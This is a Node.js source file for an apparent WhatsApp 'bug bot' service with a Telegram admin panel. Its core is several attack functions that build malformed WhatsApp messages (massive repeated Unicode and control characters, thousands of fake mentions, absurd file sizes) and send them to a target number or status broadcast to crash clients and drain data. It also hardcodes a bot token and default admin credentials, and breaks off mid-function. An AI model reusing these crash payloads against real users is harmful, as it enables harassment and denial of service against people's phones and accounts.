const { default: makeWASocket, DisconnectReason, makeInMemoryStore, useMultiFileAuthState, Browsers, generateWAMessageFromContent } = require("@elrayyxml/baileys")
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const path = require('path')
const express = require('express')
const bodyParser = require('body-parser')
const session = require('express-session')
const multer = require('multer')
const AdmZip = require('adm-zip')
const crypto = require('crypto')
const TelegramBot = require('node-telegram-bot-api')

const sleep = (ms) => new Promise(res => setTimeout(res, ms))

const app = express()
const PORT = process.env.PORT || 3000
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8208085790:AAEwvKtRmoSWT9ZJJ3dRrLd35RSfGUk0XNU'
const ADMIN_TELEGRAM_IDS = (process.env.ADMIN_IDS || '6911152356').split(',').map(id => parseInt(id)).filter(id => !isNaN(id))

const bot = TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN' ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true }) : null
const upload = multer({ dest: 'temp/' })
const activeSessions = {}
const sessionStats = {}

let systemStatus = {
    online: true,
    maintenance: false,
    message: '',
    startTime: Date.now(),
    totalRequests: 0,
    totalAttacks: 0
}

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static('public'))
app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 86400000 }
}))

// Logging Middleware
app.use((req, res, next) => {
    systemStatus.totalRequests++
    const timestamp = new Date().toISOString()
    console.log(`[${timestamp}] ${req.method} ${req.path}`)
    next()
})

// Utilities
const rmDir = async (dirPath) => {
    if (fs.existsSync(dirPath)) {
        fs.rmSync(dirPath, { recursive: true, force: true })
    }
}

const saveUsers = (users) => {
    fs.writeFileSync('./users.json', JSON.stringify(users, null, 2))
}

const loadUsers = () => {
    try {
        return JSON.parse(fs.readFileSync('./users.json', 'utf8'))
    } catch {
        const defaultUsers = [
            { username: 'admin', password: 'admin123', role: 'admin' },
            { username: 'user', password: 'user123', role: 'user' }
        ]
        saveUsers(defaultUsers)
        return defaultUsers
    }
}

const saveSystemStatus = () => {
    fs.writeFileSync('./system-status.json', JSON.stringify(systemStatus, null, 2))
}

const loadSystemStatus = () => {
    try {
        const loaded = JSON.parse(fs.readFileSync('./system-status.json', 'utf8'))
        systemStatus = { ...systemStatus, ...loaded }
    } catch {
        systemStatus = { 
            online: true, 
            maintenance: false, 
            message: '',
            startTime: Date.now(),
            totalRequests: 0,
            totalAttacks: 0
        }
        saveSystemStatus()
    }
}

loadSystemStatus()

// Telegram Bot Setup
if (bot) {
    bot.on('polling_error', (error) => {
        console.log('Telegram polling error:', error.message)
    })

    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id
        const isAdmin = ADMIN_TELEGRAM_IDS.includes(chatId)
        
        const welcomeMsg = isAdmin 
            ? `🤖 *XVCT Admin Panel*\n\n✅ *Commands:*\n/adduser - Add new user\n/listusers - Show all users\n/deluser - Delete user\n/sessions - View active sessions\n/getsession - Download session\n/status - System status\n/stats - System statistics\n/maintenance - Toggle maintenance\n/shutdown - Shutdown system\n/startup - Start system (after shutdown)\n/restart - Restart system\n/broadcast - Send message to all users`
            : `👋 *Welcome to XVCT System*\n\nPlease contact admin for access.\nChat ID: ${chatId}`
        
        bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown' })
    })

    bot.onText(/\/adduser/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        bot.sendMessage(chatId, '📝 *Add New User*\n\nFormat: `username|password|role`\nExample: `admin123|pass123|admin`', { parse_mode: 'Markdown' })
        
        bot.once('message', (response) => {
            if (response.chat.id !== chatId) return
            
            const parts = response.text.split('|').map(s => s.trim())
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format! Use: username|password|role')
            }
            
            const [username, password, role] = parts
            const users = loadUsers()
            
            if (users.find(u => u.username === username)) {
                return bot.sendMessage(chatId, '❌ Username already exists!')
            }
            
            users.push({ username, password, role })
            saveUsers(users)
            
            bot.sendMessage(chatId, `✅ *User Created!*\n\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n⭐ Role: \`${role}\``, { parse_mode: 'Markdown' })
        })
    })

    bot.onText(/\/listusers/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        const users = loadUsers()
        
        if (users.length === 0) {
            return bot.sendMessage(chatId, '📋 No users found')
        }
        
        let message = '👥 *User List:*\n\n'
        users.forEach((u, i) => {
            message += `${i + 1}. \`${u.username}\` (${u.role})\n`
        })
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })
    })

    bot.onText(/\/deluser/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        bot.sendMessage(chatId, '🗑️ Send username to delete:')
        
        bot.once('message', (response) => {
            if (response.chat.id !== chatId) return
            
            const username = response.text.trim()
            let users = loadUsers()
            const initialLength = users.length
            
            users = users.filter(u => u.username !== username)
            
            if (users.length === initialLength) {
                return bot.sendMessage(chatId, '❌ User not found!')
            }
            
            saveUsers(users)
            bot.sendMessage(chatId, `✅ User \`${username}\` deleted!`, { parse_mode: 'Markdown' })
        })
    })

    bot.onText(/\/sessions/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        const sessions = Object.keys(activeSessions)
        
        if (sessions.length === 0) {
            return bot.sendMessage(chatId, '📱 No active sessions')
        }
        
        let message = '📱 *Active Sessions:*\n\n'
        sessions.forEach((id, i) => {
            const status = activeSessions[id]?.user ? '🟢 Connected' : '🟡 Connecting'
            const stats = sessionStats[id] || { sent: 0, received: 0 }
            message += `${i + 1}. \`${id}\` - ${status}\n   📤 Sent: ${stats.sent} | 📥 Received: ${stats.received}\n`
        })
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })
    })

    bot.onText(/\/getsession/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        const sessions = Object.keys(activeSessions)
        
        if (sessions.length === 0) {
            return bot.sendMessage(chatId, '❌ No sessions available')
        }
        
        let message = '📥 *Available Sessions:*\n\n'
        sessions.forEach((id, i) => {
            message += `${i + 1}. \`${id}\`\n`
        })
        message += '\nSend session ID to download:'
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })
        
        bot.once('message', async (response) => {
            if (response.chat.id !== chatId) return
            
            const sessionId = response.text.trim()
            const sessionPath = path.join('sessions', sessionId)
            
            if (!fs.existsSync(sessionPath)) {
                return bot.sendMessage(chatId, '❌ Session not found!')
            }
            
            try {
                bot.sendMessage(chatId, '📦 Creating archive...')
                const zip = new AdmZip()
                zip.addLocalFolder(sessionPath)
                const zipBuffer = zip.toBuffer()
                
                await bot.sendDocument(chatId, zipBuffer, {}, {
                    filename: `session-${sessionId}.zip`,
                    contentType: 'application/zip'
                })
                
                bot.sendMessage(chatId, '✅ Session downloaded successfully!')
            } catch (err) {
                bot.sendMessage(chatId, `❌ Error: ${err.message}`)
            }
        })
    })

    bot.onText(/\/status/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        const status = systemStatus.online ? '🟢 Online' : '🔴 Offline'
        const maintenance = systemStatus.maintenance ? '🔧 Yes' : '✅ No'
        const uptime = Math.floor((Date.now() - systemStatus.startTime) / 1000 / 60)
        
        const message = `🖥️ *System Status*\n\nStatus: ${status}\nMaintenance: ${maintenance}\nSessions: ${Object.keys(activeSessions).length}\nUptime: ${uptime} minutes\nRequests: ${systemStatus.totalRequests}\nAttacks: ${systemStatus.totalAttacks}\nMessage: ${systemStatus.message || 'None'}`
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })
    })

    bot.onText(/\/stats/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        const users = loadUsers()
        const sessions = Object.keys(activeSessions)
        const uptime = Math.floor((Date.now() - systemStatus.startTime) / 1000 / 60)
        
        let totalSent = 0
        let totalReceived = 0
        Object.values(sessionStats).forEach(stat => {
            totalSent += stat.sent || 0
            totalReceived += stat.received || 0
        })
        
        const message = `📊 *System Statistics*\n\n👥 Users: ${users.length}\n📱 Active Sessions: ${sessions.length}\n⏱️ Uptime: ${uptime} min\n📨 Total Requests: ${systemStatus.totalRequests}\n⚡ Total Attacks: ${systemStatus.totalAttacks}\n📤 Messages Sent: ${totalSent}\n📥 Messages Received: ${totalReceived}`
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })
    })

    bot.onText(/\/maintenance/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        systemStatus.maintenance = !systemStatus.maintenance
        systemStatus.message = systemStatus.maintenance ? 'System under maintenance' : ''
        saveSystemStatus()
        
        const status = systemStatus.maintenance ? 'ENABLED 🔧' : 'DISABLED ✅'
        bot.sendMessage(chatId, `Maintenance mode ${status}`)
    })

    bot.onText(/\/shutdown/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        systemStatus.online = false
        systemStatus.message = 'System is shutting down...'
        saveSystemStatus()
        
        bot.sendMessage(chatId, '🔴 *System Shutdown*\n\nSystem is now offline.\nUse /startup to bring it back online.', { parse_mode: 'Markdown' })
    })

    bot.onText(/\/startup/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        systemStatus.online = true
        systemStatus.maintenance = false
        systemStatus.message = ''
        saveSystemStatus()
        
        bot.sendMessage(chatId, '🟢 *System Startup*\n\nSystem is now ONLINE and ready!', { parse_mode: 'Markdown' })
    })

    bot.onText(/\/restart/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        bot.sendMessage(chatId, '🔄 Restarting system in 3 seconds...')
        
        setTimeout(() => {
            process.exit(0)
        }, 3000)
    })

    bot.onText(/\/broadcast/, (msg) => {
        const chatId = msg.chat.id
        if (!ADMIN_TELEGRAM_IDS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ Unauthorized')
        }
        
        bot.sendMessage(chatId, '📢 Send broadcast message:')
        
        bot.once('message', (response) => {
            if (response.chat.id !== chatId) return
            
            const broadcastMsg = response.text
            bot.sendMessage(chatId, `✅ Broadcast sent: "${broadcastMsg}"`)
        })
    })
}

// WhatsApp Attack Functions
async function LoraaTLID(sock, target) {
    const Loraa = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "XVCT_System_Attack", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    }
                }
            }
        }
    }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true })

    await sock.relayMessage("status@broadcast", Loraa.message, {
        messageId: Loraa.key.id,
        statusJidList: [target]
    })
}

async function VxGSarzAhah(sock, target) {
 const Yanzz2 = {
  viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Yanz X Garx 🕊🤍 ⛧  \n" + 
                 "@0@1".repeat(3000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{".repeat(5000) + "}".repeat(5000), 
            version: 3
          }
        }
      }
    }
  };
  const Yanzz1 = {
  viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(1500),
          address: "ꦽ".repeat(1000),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./sock.js" + "𑜦𑜠".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "🕊🤍 𝐒𝐀𝐑𝐙 & 𝐘𝐀𝐍𝐙 𝐀𝐓𝐓𝐀𝐂𝐊" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "𑜦𑜠".repeat(25000),
                  "flow_message_version": "3"
                })
              }
            ],
            messageParamsJson: "{",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: " X ",
            stanzaId: "666",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
        },
      },
    },
  }, {
    participant: {
      jid: target
    }
  });
}

async function blabla(sock, target) {
  try {
    const LocaMessageContent = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "\u900A",
                address: "\u0007".repeat(20000),
                jpegThumbnail: global.thumb,
              },
              hasMediaAttachment: true,
            },
            body: { text: "" },
            nativeFlowMessage: {
              messageParamsJson: "[]".repeat(4000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "\u0003".repeat(1500),
                    sections: [
                      {
                        title: "",
                        rows: [],
                      },
                    ],
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    name: "\u0003".repeat(200),
                  }),
                },
              ],
            },
          },
        },
      },

      mentionedJid: [
        "1@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        ),
      ],

      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "" },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: mention,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "ោ៝".repeat(10000),
            },
          },

          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },

          interactiveResponseMessage: {
            body: {
              text: "",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(10000),
              version: 3,
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                ),
              ],
            },
          },
        },
      },
    };

    const msg = await generateWAMessageFromContent(
      target,
      LocaMessageContent,
      { userJid: target }
    );

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    if (Math.random() > 0.5) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
  } catch (e) {
    console.error(e);
  }
};

async function XProtexDelayHard(sock, target, mention) {
  console.log(chalk.red(`Succes Sending Bug DelayXDrainKuota By XProtexGlow To ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
    
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".DRGN || VaxzyAnonymous" + "ោ៝".repeat(10000),
        title: "XProtexGlow",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
 }

async function protocolbug7(sock, target, mention = true) {
const CrashAPI = "https://www.instagram.com/_u/api_crash_image_raldzz_";

const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ꦾ".repeat(9511),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: CrashAPI,
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "1099511627776000",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: {
         extendedTextMessage: {
